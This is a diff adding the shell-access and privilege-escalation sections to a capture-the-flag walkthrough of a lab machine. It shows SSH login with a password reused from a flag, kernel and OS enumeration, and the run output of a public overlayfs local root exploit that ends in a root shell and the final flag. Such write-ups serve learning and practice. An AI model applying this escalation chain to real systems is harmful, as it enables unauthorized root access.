@@ -49,7 +49,9 @@ Flag1: cybersploit{youtube.com/c/cybersploit}
 
 i tried enumerating different things and i found nothing, then tried to brute force the SSH service with `rockyou.txt` and it didn not work
 
-then i used flag1 ( `cybersploit{youtube.com/c/cybersploit}` ) as password and yes i connected to machine :
+### 3.Gaining Shell
+
+Then i used flag1 ( `cybersploit{youtube.com/c/cybersploit}` ) as password and yes i connected to machine :
 
 ```bash
 ssh itsskv@192.168.127.134
@@ -68,7 +70,65 @@ Run 'do-release-upgrade' to upgrade to it.
 Your Hardware Enablement Stack (HWE) is supported until April 2017.
 ```
 
+### 4.Privilege Escalation
 
+Check os version and kernel :
+
+```bash
+itsskv@cybersploit-CTF:~$ uname -a
+Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
+
+itsskv@cybersploit-CTF:~$ cat /etc/*-release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=12.04
+DISTRIB_CODENAME=precise
+DISTRIB_DESCRIPTION="Ubuntu 12.04.5 LTS"
+NAME="Ubuntu"
+VERSION="12.04.5 LTS, Precise Pangolin"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu precise (12.04.5 LTS)"
+VERSION_ID="12.04"
+```
+
+search for an exploit online and you will find `'overlayfs' Local Privilege Escalation`, upload it on the server and compile it :
+
+```bash
+itsskv@cybersploit-CTF:/tmp$ ./a.out 
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
+
+# cd /root
+
+# cat finalflag.txt
+  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
+ /      |\   \  /   / |   _  \  |   ____||   _  \        /       ||   _  \  |  |      /  __  \  |  | |           |
+|  ,----' \   \/   /  |  |_)  | |  |__   |  |_)  |      |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
+|  |       \_    _/   |   _  <  |   __|  |      /        \   \    |   ___/  |  |     |  |  |  | |  |     |  |     
+|  `----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  `----.|  `--'  | |  |     |  |     
+ \______|    |__|     |______/  |_______|| _| `._____|_______/    | _|      |_______| \______/  |__|     |__|     
+                                                                                                                  
+
+   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
+  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
+ ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
+  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
+
+flag3: cybersploit{Z3X21CW42C4 many many congratulations !}
+
+if you like it share with me https://twitter.com/cybersploit1.
+
+Thanks !
+```
+
+This is how you can get root on this machine :)
 
 
 
